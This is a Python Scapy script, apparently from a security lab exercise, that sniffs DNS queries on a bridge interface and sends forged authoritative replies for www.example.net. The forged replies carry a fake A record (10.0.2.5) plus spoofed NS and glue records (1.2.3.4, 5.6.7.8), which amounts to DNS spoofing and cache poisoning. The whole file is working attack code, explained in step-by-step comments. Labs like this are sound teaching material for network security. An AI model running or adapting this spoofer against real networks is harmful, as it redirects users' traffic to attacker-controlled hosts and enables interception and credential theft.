#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  # Condition for matching the IP address of the packet with the DNS listing for www.example.net
  if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):

    # Creates an IP object using the packet's source as the destination and the packet's destination 
    # as the source
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Creates a UDP object using the packet's source port as the destination port and manually setting 
    # the source port to 53
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # Creates a DNSRR object for the answer section, takes packet's qname for the rrname, is of type A, 
    # has a time to live of 259200, and a manual IP address of 10.0.2.5
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')

    # Creates a DNSRR object for the authority section, takes the matching domain from the original if 
    # statement for the rrname, type NS, time to live of 259200, and manual domain rdata of 
    # ns1.example.net
    NSsec1 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns1.example.net')
    # Creates another DNSRR object for the authority section, takes the same matching domain from the 
    # if statement, same type and time to live, but a different rdata with ns2 as the subdomain
    NSsec2 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns2.example.net')

    # Each of these listings creates a DNSRR object, using the two rdata domains from the nameserver 
    # listings created above, type A, same time to live, and has two manual spoofed IP addresses 
    # being 1.2.3.4 and 5.6.7.8
    Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
                    ttl=259200, rdata='5.6.7.8')

    # This line creates a DNS object using all of the previously created objects, adds speceified 
    # options (authoritiative answer, no recursion, query response bit), adds quantities of objects 
    # (1 query domain, 1 in answer section, 2 in authority section, 2 in additional section) and 
    # specifies the object names for those sections
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=2,
                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

    # This line combines the IP, UDP, and DNS objects into a complete spoofed packet
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    # This line sends the packet out using the scapy function
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53'
pkt = sniff(iface='br-1efb562e7e6a', filter=f, prn=spoof_dns)      
